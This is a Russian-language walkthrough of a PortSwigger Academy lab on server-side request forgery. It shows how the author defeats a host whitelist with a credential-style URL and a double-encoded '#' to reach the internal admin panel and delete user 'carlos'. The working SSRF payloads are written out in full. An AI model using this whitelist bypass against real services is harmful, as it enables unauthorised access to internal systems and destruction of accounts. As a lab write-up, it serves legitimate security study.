Перейдем на админскую панель, добавив `/admin` в исходный url, и увидим, что у нас недостаточно прав 
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/1.png)
Далее вернемся на исходную страницу, выберем случайный товар и по кнопке `Get stock` найдем его количество на складе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/2.png)

Перейдем в `Proxy` -> `HTTP history` и найдем данный запрос 
```
POST /product/stock
...
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D2
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/3.png)
Далее изменим параметр `stockApi` на `127.0.0.1`
```
POST /product/stock
...
stockApi=http://127.0.0.1
```
на что получим ответ `"External stock check host must be stock.weliketoshop.net"`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/4.png)
Предположим, что разработчики завайтлистили домен, с которого можно делать запросы. Используем предлагаемый домен
`stockApi=http://username@stock.weliketoshop.net/`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/5.png)
добавим `#` в `stockApi`
```
stockApi=http://username#@stock.weliketoshop.net
```
и получим уже знакомую запись - "External stock check host must be stock.weliketoshop.net"
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/6.png)
Применим двойную URL кодировку, чтобы веб-приложение съело #
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/7.png)
```
POST /product/stock
...
stockApi=http://username%25%32%33@stock.weliketoshop.net
```
Отлично, выдало `internal server error`, значит мы на верном пути
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/8.png)
перейдем на локалхост в надежде, что нас пропустит
```
POST /product/stock
...
stockApi=http://localhost%25%32%33@stock.weliketoshop.net
```
отлично, мы снова получили нашу исходную страницу
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/9.png)
Далее перейдем на админскую панель и удалим УЗ `carlos` и нажав `Follow redirection` получим уведомление об успешно выполненной лабораторной работе
```
POST /product/stock
...
stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/9.%20Server-side%20request%20forgery%20(SSRF)/4.%20SSRF%20with%20whitelist-based%20input%20filter/pics%20for%20walktrough/10.png)
